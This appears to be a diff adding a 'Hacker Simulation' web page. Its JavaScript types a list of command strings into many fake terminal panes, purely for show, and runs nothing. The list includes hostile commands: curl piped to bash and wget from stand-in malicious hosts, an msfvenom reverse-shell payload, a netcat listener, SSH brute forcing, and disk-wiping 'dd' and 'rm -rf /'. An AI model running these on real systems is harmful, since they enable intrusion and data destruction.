@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Simulation</title>
+    <style>
+        body {
+            background-color: black;
+            color: #00FF00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        .terminal {
+            width: 100%;
+
+            overflow-y: auto;
+            padding: 5px;
+            box-sizing: border-box;
+            white-space: pre-wrap;
+            background-color: black;
+            margin: 0; /* Removed the gap between terminals */
+        }
+        .line {
+            display: flex;
+        }
+        .command {
+            color: #00FF00;
+        }
+        .output {
+            color: #FFFFFF;
+        }
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background-color: #00FF00;
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .graph {
+            width: 100%;
+            height: 20px;
+            background-color: #444;
+            margin: 10px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            background-color: green;
+            width: 0%;
+        }
+        #accessGranted {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: green;
+            color: white;
+            font-size: 24px;
+            border-radius: 5px;
+        }
+        #alert {
+            display: none;
+            position: fixed;
+            top: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: red;
+            color: white;
+            font-size: 20px;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .hacking-message {
+            color: #FF4500;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="terminal" id="terminal1"></div>
+<div class="terminal" id="terminal2"></div>
+<div class="terminal" id="terminal3"></div>
+<div class="terminal" id="terminal4"></div>
+<div class="terminal" id="terminal5"></div>
+<div class="terminal" id="terminal6"></div>
+<div class="terminal" id="terminal7"></div>
+<div class="terminal" id="terminal8"></div>
+<div class="terminal" id="terminal9"></div>
+<div class="terminal" id="terminal10"></div>
+<div class="terminal" id="terminal11"></div>
+<div class="terminal" id="terminal12"></div>
+<div class="terminal" id="terminal13"></div>
+<div class="terminal" id="terminal14"></div>
+<div class="terminal" id="terminal15"></div>
+<div class="terminal" id="terminal16"></div>
+<div class="terminal" id="terminal17"></div>
+<div class="terminal" id="terminal18"></div>
+<div class="terminal" id="terminal19"></div>
+<div class="terminal" id="terminal20"></div>
+<div class="terminal" id="terminal21"></div>
+<div class="terminal" id="terminal22"></div>
+<div class="terminal" id="terminal23"></div>
+<div class="terminal" id="terminal24"></div>
+<div class="terminal" id="terminal25"></div>
+<div class="terminal" id="terminal26"></div>
+<div class="terminal" id="terminal27"></div>
+<div class="terminal" id="terminal28"></div>
+<div class="terminal" id="terminal29"></div>
+<div class="terminal" id="terminal30"></div>
+<div class="terminal" id="terminal31"></div>
+<div class="terminal" id="terminal32"></div>
+<div class="terminal" id="terminal33"></div>
+<div class="terminal" id="terminal34"></div>
+<div class="terminal" id="terminal35"></div>
+<div class="terminal" id="terminal36"></div>
+<div class="terminal" id="terminal37"></div>
+<div class="terminal" id="terminal38"></div>
+<div class="terminal" id="terminal39"></div>
+<div class="terminal" id="terminal40"></div>
+<div class="terminal" id="terminal41"></div>
+<div class="terminal" id="terminal42"></div>
+<div class="terminal" id="terminal43"></div>
+<div class="terminal" id="terminal44"></div>
+<div class="terminal" id="terminal45"></div>
+<div class="terminal" id="terminal46"></div>
+<div class="terminal" id="terminal47"></div>
+<div class="terminal" id="terminal48"></div>
+<div class="terminal" id="terminal49"></div>
+<div class="terminal" id="terminal50"></div>
+<div class="terminal" id="terminal51"></div>
+<div class="terminal" id="terminal52"></div>
+<div class="terminal" id="terminal53"></div>
+<div class="terminal" id="terminal54"></div>
+<div class="terminal" id="terminal55"></div>
+<div class="terminal" id="terminal56"></div>
+<div class="terminal" id="terminal57"></div>
+<div class="terminal" id="terminal58"></div>
+<div class="terminal" id="terminal59"></div>
+<div class="terminal" id="terminal60"></div>
+<div class="terminal" id="terminal61"></div>
+<div class="terminal" id="terminal62"></div>
+<div class="terminal" id="terminal63"></div>
+<div class="terminal" id="terminal64"></div>
+<div class="terminal" id="terminal65"></div>
+<div class="terminal" id="terminal66"></div>
+<div class="terminal" id="terminal67"></div>
+<div class="terminal" id="terminal68"></div>
+<div class="terminal" id="terminal69"></div>
+<div class="terminal" id="terminal70"></div>
+<div class="terminal" id="terminal71"></div>
+<div class="terminal" id="terminal72"></div>
+<div class="terminal" id="terminal73"></div>
+<div class="terminal" id="terminal74"></div>
+<div class="terminal" id="terminal75"></div>
+<div class="terminal" id="terminal76"></div>
+<div class="terminal" id="terminal77"></div>
+<div class="terminal" id="terminal78"></div>
+<div class="terminal" id="terminal79"></div>
+<div class="terminal" id="terminal80"></div>
+<div class="terminal" id="terminal81"></div>
+<div class="terminal" id="terminal82"></div>
+<div class="terminal" id="terminal83"></div>
+<div class="terminal" id="terminal84"></div>
+<div class="terminal" id="terminal85"></div>
+<div class="terminal" id="terminal86"></div>
+<div class="terminal" id="terminal87"></div>
+<div class="terminal" id="terminal88"></div>
+<div class="terminal" id="terminal89"></div>
+<div class="terminal" id="terminal90"></div>
+<div class="terminal" id="terminal91"></div>
+<div class="terminal" id="terminal92"></div>
+<div class="terminal" id="terminal93"></div>
+<div class="terminal" id="terminal94"></div>
+<div class="terminal" id="terminal95"></div>
+<div class="terminal" id="terminal96"></div>
+<div class="terminal" id="terminal97"></div>
+<div class="terminal" id="terminal98"></div>
+<div class="terminal" id="terminal99"></div>
+<div class="terminal" id="terminal100"></div>
+<div class="terminal" id="terminal101"></div>
+<div class="terminal" id="terminal102"></div>
+<div class="terminal" id="terminal103"></div>
+<div class="terminal" id="terminal104"></div>
+<div class="terminal" id="terminal105"></div>
+<div class="terminal" id="terminal106"></div>
+<div class="terminal" id="terminal107"></div>
+<div class="terminal" id="terminal108"></div>
+<div class="terminal" id="terminal109"></div>
+<div class="terminal" id="terminal110"></div>
+<div class="terminal" id="terminal111"></div>
+<div class="terminal" id="terminal112"></div>
+<div class="terminal" id="terminal113"></div>
+<div class="terminal" id="terminal114"></div>
+<div class="terminal" id="terminal115"></div>
+<div class="terminal" id="terminal116"></div>
+<div class="terminal" id="terminal117"></div>
+<div class="terminal" id="terminal118"></div>
+<div class="terminal" id="terminal119"></div>
+<div class="terminal" id="terminal120"></div>
+<div class="terminal" id="terminal121"></div>
+<div class="terminal" id="terminal122"></div>
+<div class="terminal" id="terminal123"></div>
+<div class="terminal" id="terminal124"></div>
+<div class="terminal" id="terminal125"></div>
+<div class="terminal" id="terminal126"></div>
+<div class="terminal" id="terminal127"></div>
+<div class="terminal" id="terminal128"></div>
+<div class="terminal" id="terminal129"></div>
+<div class="terminal" id="terminal130"></div>
+<div class="terminal" id="terminal131"></div>
+<div class="terminal" id="terminal132"></div>
+<div class="terminal" id="terminal133"></div>
+<div class="terminal" id="terminal134"></div>
+<div class="terminal" id="terminal135"></div>
+<div class="terminal" id="terminal136"></div>
+<div class="terminal" id="terminal137"></div>
+<div class="terminal" id="terminal138"></div>
+<div class="terminal" id="terminal139"></div>
+<div class="terminal" id="terminal140"></div>
+<div class="terminal" id="terminal141"></div>
+<div class="terminal" id="terminal142"></div>
+<div class="terminal" id="terminal143"></div>
+<div class="terminal" id="terminal144"></div>
+<div class="terminal" id="terminal145"></div>
+<div class="terminal" id="terminal146"></div>
+<div class="terminal" id="terminal147"></div>
+<div class="terminal" id="terminal148"></div>
+<div class="terminal" id="terminal149"></div>
+<div class="terminal" id="terminal150"></div>
+
+
+<div class="graph" id="graph">
+    <div class="progress-bar" id="progressBar"></div>
+</div>
+<div id="accessGranted">Access Granted! Initiating Hacking Sequence...</div>
+<div id="alert">ALERT: System Breach Detected!</div>
+
+<script>
+const commands = [
+    "sudo bettercap -X",
+    "sudo wifite -i wlan0 --attack wpa",
+    "aircrack-ng MyWiFiNetwork.cap",
+    "nmap -sP 192.168.1.0/24",
+    "hydra -l admin -P /path/to/wordlist.txt ssh://192.168.1.5",
+    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf > shell.elf",
+    "john /path/to/hashfile.txt",
+    "airmon-ng start wlan0",
+    "sudo aircrack-ng my_capture.cap",
+    "netdiscover -r 192.168.1.0/24",
+    "sudo tcpdump -i eth0 -w capture.pcap",
+    "hashcat -m 0 /path/to/hashfile.txt /path/to/wordlist.txt",
+    "dirb http://target.com",
+    "sudo nmap -O 192.168.1.5",
+    "sudo metasploit-framework",
+    "sudo nmap -sT 192.168.1.5", // Scan TCP ports
+    "nmap -p- 192.168.1.5", // Scan all ports
+    "netstat -tuln", // Show active network connections
+    "curl -s https://example.com/malicious_script.sh | bash", // Download and execute malicious script
+    "curl -X POST http://target.com/login -d 'user=admin&pass=admin123'", // Simulate login attempt
+    "sudo systemctl start apache2", // Start Apache web server
+    "sudo systemctl restart networking", // Restart networking service
+    "sudo ip link set eth0 up", // Bring up the Ethernet interface
+    "dd if=/dev/zero of=/dev/sda bs=1M", // Wipe the hard drive
+    "cat /etc/passwd", // Display user list
+    "sudo chown root:root /path/to/vulnerable/file", // Change ownership of a file
+    "sudo chmod 777 /path/to/vulnerable/file", // Give full permissions to a file
+    "scp user@192.168.1.5:/path/to/file /local/path", // Securely copy a file from remote to local
+    "sudo ufw enable", // Enable firewall
+    "sudo ufw allow 80", // Allow HTTP port through the firewall
+    "sudo ufw deny 22", // Block SSH port
+    "sudo apt-get install metasploit-framework", // Install Metasploit Framework
+    "sudo apt-get install aircrack-ng", // Install aircrack-ng
+    "sudo apt-get update", // Update system repositories
+    "sudo apt-get upgrade", // Upgrade all packages
+    "sudo apt-get dist-upgrade", // Perform a distribution upgrade
+    "whoami", // Display current user
+    "ls -alh", // List files in the current directory
+    "ps aux | grep apache2", // Check for Apache processes
+    "sudo tcpdump -i eth0 port 80", // Capture HTTP traffic
+    "sudo iwconfig wlan0", // Show wireless interface configuration
+    "sudo iwlist wlan0 scan", // Scan for available Wi-Fi networks
+    "sudo iwconfig wlan0 essid 'MyWiFiNetwork'", // Connect to a Wi-Fi network
+    "sudo iptables -L", // List firewall rules
+    "sudo netcat -lvnp 4444", // Set up a reverse shell listener
+    "wget http://malicious-site.com/malware.sh", // Download malware
+    "python3 -m http.server 8000", // Start a simple HTTP server
+    "echo '127.0.0.1 malicious-site.com' | sudo tee -a /etc/hosts", // Add fake DNS entry
+    "sudo ufw status", // Check firewall status
+    "sudo systemctl status apache2", // Check Apache status
+    "sudo nmap -sS -p 1-65535 192.168.1.5", // Perform stealth scan on all ports
+    "sudo netcat -l -p 9999", // Open a listener on port 9999
+    "sudo tcpdump -i eth0 -n port 443", // Capture HTTPS traffic
+    "echo 'hacked' > /etc/motd", // Change message of the day
+    "sudo shutdown -h now", // Shutdown the system
+    "sudo reboot", // Reboot the system
+    "echo 'hacked' > /var/www/html/index.html", // Modify web server's index page
+    "sudo rm -rf /", // Dangerous command (delete everything)
+    "sudo chroot /mnt", // Change root directory
+    "sudo passwd root", // Change root password
+    "sudo su", // Switch to root user
+    "openssl genpkey -algorithm RSA -out private_key.pem", // Generate RSA private key
+    "openssl req -new -key private_key.pem -out request.csr", // Create certificate signing request
+    "openssl x509 -req -in request.csr -signkey private_key.pem -out certificate.crt", // Self-sign certificate
+];
+
+const typingSpeed = 20; // Faster typing speed (decreased to 20ms)
+const terminals = document.querySelectorAll('.terminal');
+const progressBar = document.getElementById('progressBar');
+const accessGranted = document.getElementById('accessGranted');
+const alertBox = document.getElementById('alert');
+let commandHistory = new Set(); // Set to track unique commands
+
+// Function to simulate typing in terminal
+function typeCommand(terminal, command, index) {
+    if (commandHistory.has(command)) {
+        return; // Skip if the command is already in the history
+    }
+    commandHistory.add(command); // Add the command to history to prevent repetition
+
+    let charIndex = 0;
+    const line = document.createElement('div');
+    line.classList.add('line');
+    line.innerHTML = `<span class="command">root@kali:~# </span><span class="output"></span><span class="cursor"></span>`;
+    terminal.appendChild(line);
+
+    const outputSpan = line.querySelector('.output');
+    const cursorSpan = line.querySelector('.cursor');
+
+    function typeCharacter() {
+        if (charIndex < command.length) {
+            outputSpan.innerHTML += command[charIndex];
+            charIndex++;
+            setTimeout(typeCharacter, typingSpeed);
+        } else {
+            cursorSpan.style.display = 'none'; // Hide the cursor when done
+            if (index === commands.length - 1) {
+                setTimeout(() => {
+                    document.getElementById('accessGranted').style.display = 'block';
+                }, 100);
+            }
+        }
+
+        // Scroll the terminal to the bottom after each character is typed
+        terminal.scrollTop = terminal.scrollHeight; // Forces scroll to the bottom
+    }
+
+    typeCharacter();
+}
+
+
+// Simulate multiple terminal commands very fast
+function simulateTerminal() {
+    terminals.forEach((terminal, index) => {
+        setTimeout(() => {
+            typeCommand(terminal, commands[index % commands.length], index);
+        }, index * 200); // Fasten up the terminal typing speed with shorter delay (200ms)
+    });
+}
+
+// Simulate progress bar for hacking
+function simulateProgress() {
+    let width = 0;
+    const interval = setInterval(() => {
+        if (width >= 100) {
+            clearInterval(interval);
+            showAlert();  // Trigger alert when progress completes
+        } else {
+            width++;
+            progressBar.style.width = width + '%';
+        }
+    }, 30); // Speed up progress bar (30ms interval)
+}
+
+// Function to trigger an alert
+function showAlert() {
+    alertBox.style.display = 'block';
+    setTimeout(() => {
+        alertBox.style.display = 'none';
+    }, 1000); // Hide alert quickly after 1 second
+}
+
+// Initialize the simulation
+function startSimulation() {
+    simulateTerminal();
+    simulateProgress();
+    setTimeout(startSimulation, 0); // Loop the simulation infinitely
+}
+
+startSimulation();
+</script>
+
+</body>
+</html>
